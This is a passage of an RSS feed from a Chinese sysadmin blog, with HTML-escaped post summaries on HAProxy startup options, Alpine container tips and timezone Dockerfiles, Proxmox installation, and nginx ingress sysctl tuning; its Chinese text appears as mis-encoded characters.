&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;forking, and errors are not reported anymore in the terminal. It is&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;equivalent to the &amp;#34;daemon&amp;#34; keyword in the &amp;#34;global&amp;#34; section of the&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;configuration. It is recommended to always force it in any init script so&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;that a faulty configuration doesn&amp;#39;t prevent the system from booting.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;-W : master-worker mode. It is equivalent to the &amp;#34;master-worker&amp;#34; keyword in&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;the &amp;#34;global&amp;#34; section of the configuration. This mode will launch a &amp;#34;master&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;which will monitor the &amp;#34;workers&amp;#34;. Using this mode, you can reload HAProxy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;directly by sending a SIGUSR2 signal to the master.  The master-worker mode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;is compatible either with the foreground or daemon mode.  It is&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;recommended to use this mode with multiprocess and systemd.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;-Ws : master-worker mode with support of `notify` type of systemd service.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;This option is only available when HAProxy was built with `USE_SYSTEMD`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;build option enabled.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…·ä½“çš„å¯åŠ¨è„šæœ¬ï¼š/etc/systemd/system/haproxy.service&lt;/p&gt;</description>
    </item>
    <item>
      <title>alphineé•œåƒçš„ä½¿ç”¨æŠ€å·§</title>
      <link>https://rendoumi.com/posts/20211104-alphine_usage/</link>
      <pubDate>Thu, 04 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211104-alphine_usage/</guid>
      <description>&lt;p&gt;ç”¨ alphine é•œåƒçš„ä¸€äº›å¸¸ç”¨æŠ€å·§ï¼š&lt;/p&gt;
&lt;p&gt;ä¼šéšæ—¶å¢åŠ ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¿®æ”¹æºç”¨å›½å¤–çš„æºéå¸¸æ…¢æ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº&#34;&gt;ä¸€ã€ä¿®æ”¹æºï¼Œç”¨å›½å¤–çš„æºéå¸¸æ…¢ï¼Œæ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -i &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&amp;#39;&lt;/span&gt; /etc/apk/repositories
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒæ›´æ–°apkåº“&#34;&gt;äºŒã€æ›´æ–°apkåº“&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk update
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰å®‰è£…è½¯ä»¶&#34;&gt;ä¸‰ã€å®‰è£…è½¯ä»¶&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å®‰è£…telnet&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk add busybox-extras
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å®‰è£…curl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk add curl
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å®‰è£…æ—¶é—´ç»„ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk add tzdata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ›´æ–°å¹¶ä¸”å®‰è£…è½¯ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apk add --update tzdata
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å››è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºæ›´æ–°å®‰è£…&#34;&gt;å››ã€è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºã€æ›´æ–°ã€å®‰è£…&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -i &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&amp;#39;&lt;/span&gt; /etc/apk/repositories &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apk update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apk add curl &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apk add busybox-extras
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äº”è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜&#34;&gt;äº”ã€è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜&lt;/h2&gt;
&lt;p&gt;å¦‚æœä¸lnä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯ç¼ºå°‘glibcåº“ï¼ï¼ï¼è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RUN mkdir /lib64 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å…­ä¸€äº›è°ƒè¯•çš„cmd&#34;&gt;å…­ã€ä¸€äº›è°ƒè¯•çš„CMD&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CMD &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;while true; do echo hi; sleep 10; done&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl run curlpod --image&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;radial/busyboxplus:curl --command -- /bin/sh -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;while true; do echo hi; sleep 10; done&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸ƒpodçš„ç­‰å¾…æŠ€å·§&#34;&gt;ä¸ƒã€podçš„ç­‰å¾…æŠ€å·§&lt;/h2&gt;
&lt;p&gt;è¿™å„¿é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ&lt;/p&gt;</description>
    </item>
    <item>
      <title>alphineé•œåƒä¸­timezoneçš„è®¾å®š</title>
      <link>https://rendoumi.com/posts/20211103-alphine_timezone/</link>
      <pubDate>Wed, 03 Nov 2021 11:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211103-alphine_timezone/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬éƒ½å–œæ¬¢ç”¨ alphine çš„é•œåƒåšåº•åŒ…ï¼Œæ¥ç”Ÿäº§è‡ªå·±çš„é•œåƒ&lt;/p&gt;
&lt;p&gt;alphine çš„åº•åŒ…çš„æ—¶é—´è®¾å®šå°±éå¸¸é‡è¦äº†&lt;/p&gt;
&lt;p&gt;ç›´æ¥ç»™å‡º Dockerfile&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FROM alpine:3.12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# latest certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add ca-certificates --no-cache &amp;amp;&amp;amp; update-ca-certificates&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# timezone support&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV TZ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Asia/Shanghai&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add --update tzdata --no-cache &amp;amp;&amp;amp;\&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;cp /usr/share/zoneinfo/${TZ} /etc/localtime &amp;amp;&amp;amp;\&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;echo $TZ &amp;gt; /etc/timezone&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# install chrony and place default conf which can be overridden with volume&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add --no-cache chrony &amp;amp;&amp;amp; mkdir -p /etc/chrony&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;COPY chrony.conf /etc/chrony/.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# port exposed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EXPOSE 123/udp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;CMD [ &amp;#34;/usr/sbin/chronyd&amp;#34;, &amp;#34;-d&amp;#34;, &amp;#34;-s&amp;#34;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ—¶é—´è®¾å®šé‡è¦çš„å°±æ˜¯ä¸‹é¢è¿™å‡ è¡Œ&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”Ÿäº§ç¯å¢ƒProxmox 7.02çš„å®‰è£…å’Œé…ç½®</title>
      <link>https://rendoumi.com/posts/20211103-proxmox/</link>
      <pubDate>Wed, 03 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211103-proxmox/</guid>
      <description>&lt;p&gt;å…¶å®æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒä¸€ç›´æ˜¯ KVM ï¼Œç„¶åç”¨ shell è„šæœ¬æ§åˆ¶è™šæœºçš„ç”Ÿæˆï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº† Cloud-init çš„æ ‡å‡†é•œåƒã€‚&lt;/p&gt;
&lt;p&gt;å¬è¯´ Proxmox ä¹Ÿå¾ˆä¸é”™ï¼Œäºæ˜¯æƒ³çœ‹çœ‹èƒ½å¦ä¹Ÿåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ä¸Š&lt;/p&gt;
&lt;p&gt;å¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ï¼Œå¿…é¡»è¦è®© proxmox æ”¯æŒ cloud-init ï¼Œå¦åˆ™æ— æ„ä¹‰ï¼Œä¸‹é¢ä¹Ÿè¯´ä¸€ä¸‹è·‘åœ¨ç”Ÿäº§çš„æ³¨æ„äº‹é¡¹&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬ç”¨å…‰ç›˜å®‰è£…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211103100713668&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211103100713668.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åç¬¬ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯ç¡¬ç›˜ï¼Œé€‰ Options åï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211103101222517&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211103101222517.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¼šå†’å‡ºä¸€å †é€‰é¡¹ï¼Œå…¬å¸çš„ç”Ÿäº§ç¯å¢ƒï¼ŒæœåŠ¡å™¨å¦‚æœæ²¡æœ‰ raid å¡æ˜¯å¾ˆå¥‡æ€ªçš„ï¼Œæ‰€ä»¥ zfs åè€Œä¸æ˜¯æ ‡é…ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šäº‹å…ˆåœ¨ raid å¡ä¸Šåˆ’åˆ†å¥½ç¡¬ç›˜ï¼Œç”Ÿäº§ç¯å¢ƒåŸºæœ¬å¿…ç„¶æ˜¯ raid10 ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ ext4 å’Œ xfs äºŒé€‰ä¸€äº†ï¼Œå…«æˆ’é€‰ ext4 ï¼Œå› ä¸ºåäº†å¥½ä¿®ç†ï¼Œxfs_repair ç”¨èµ·æ¥ç›¸å½“é¾Ÿæ¯›ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211103101317418&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211103101317418.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼Œé€‰å®šäº† ext4 ï¼Œæ¥ä¸‹æ¥å°±æ¯”è¾ƒé‡è¦äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211103104456187&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211103104456187.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;hdsize 1116.0 ï¼Œå•ä½æ˜¯Gï¼Œè¿™ä¸ªæ˜¯è‡ªåŠ¨æ”¶é›†ä¸Šæ¥çš„ï¼Œä¸ç”¨æ”¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;swapsizeï¼Œäº¤æ¢åˆ†åŒºå¤§å°ï¼Œè¿™ä¸ªç»™ 8 Gï¼ˆæœ€å¤§8Gï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;maxrootï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå­˜æ”¾ iso å’Œ template çš„ï¼Œéœ€è¦ç»™å¤Ÿï¼Œ100 G&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;minfreeï¼Œç¬¬ä¸€ä¸ªåˆ†åŒºæœ€å°ç•™å¤šå¤§ï¼Œç»™ 10 Gï¼ˆç¼ºçœ16Gï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;maxvzï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬äºŒä¸ªåˆ†åŒºï¼Œå­˜æ”¾å®é™…çš„è™šæœºæ–‡ä»¶ï¼Œå…¨éƒ½ç”¨ä¸Šï¼Œä»€ä¹ˆä¹Ÿä¸å¡«å†™&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åç»§ç»­ï¼Œå›½å®¶é€‰ chinaï¼ŒHostname å¡«å†™ proxmox-168-86-103.localï¼Œå†å¡«å†™å¥½å…¶ä»–ä¿¡æ¯ï¼Œå°±å®‰è£…æˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211202114720545&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211202114720545.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211202114814774&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211202114814774.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª localï¼Œ100Gï¼Œå¯¹åº”ä¸Šé¢çš„ maxroot&lt;/p&gt;
&lt;p&gt;ç„¶å local-lvm ï¼Œå°±æ˜¯å‰©ä½™æ”¾è™šæœºçš„ç©ºé—´&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211103110216144&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211103-proxmox/image-20211103110216144.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>k8sä¸­nginx ingressçš„æ€§èƒ½ä¼˜åŒ–</title>
      <link>https://rendoumi.com/posts/20211102-ingress_nginx/</link>
      <pubDate>Tue, 02 Nov 2021 11:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211102-ingress_nginx/</guid>
      <description>&lt;p&gt;kubernetes ä¸­ nginx ingress çš„ä¼˜åŒ–åˆ†ä¸¤éƒ¨åˆ†&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ–&#34;&gt;ä¸€ã€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ–&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆæ˜¯å¯¹nginxå¯åŠ¨å‰çš„ç³»ç»Ÿæ€§èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œè¿™éƒ¨åˆ†è°ƒæ•´ç½‘ç»œçš„ç¼“å†²åŒºï¼Œå‡å°é—²ç½® socket å…³é—­çš„æ—¶é—´&lt;/p&gt;
&lt;p&gt;ä»¥é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ deployments çš„ nginx-ingress-controller&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;na&#34;&gt;initContainers:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;na&#34;&gt;- command:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;- /bin/sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;- -c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;- |&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;mount -o remount rw /proc/sys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;sysctl -w net.core.somaxconn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;65535
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w net.ipv4.ip_local_port_range=&amp;#34;1024 65535&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w net.ipv4.tcp_tw_reuse=1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w fs.file-max=1048576
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w net.ipv4.tcp_keepalive_time = 300
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w net.ipv4.tcp_keepalive_probes = 5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          sysctl -w net.ipv4.tcp_keepalive_intvl = 15
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒnginx-ingress-å‚æ•°ä¼˜åŒ–&#34;&gt;äºŒã€nginx ingress å‚æ•°ä¼˜åŒ–&lt;/h2&gt;
&lt;p&gt;å¤§å®¶åˆ¶åŠ¨ï¼Œnginx ingree å…¶å®æ˜¯åšä¸ºä¸€ä¸ªä¸­é—´ä»£ç†ï¼Œæ‰€ä»¥ä¸Šä¸‹æ¸¸çš„socketå‚æ•°ä¹Ÿéœ€è¦ä¼˜åŒ–&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxå†…æ ¸sysctlå†…æ ¸å‚æ•°ä¼˜åŒ–</title>
      <link>https://rendoumi.com/posts/20211102-sysctl_conf/</link>
      <pubDate>Tue, 02 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211102-sysctl_conf/</guid>
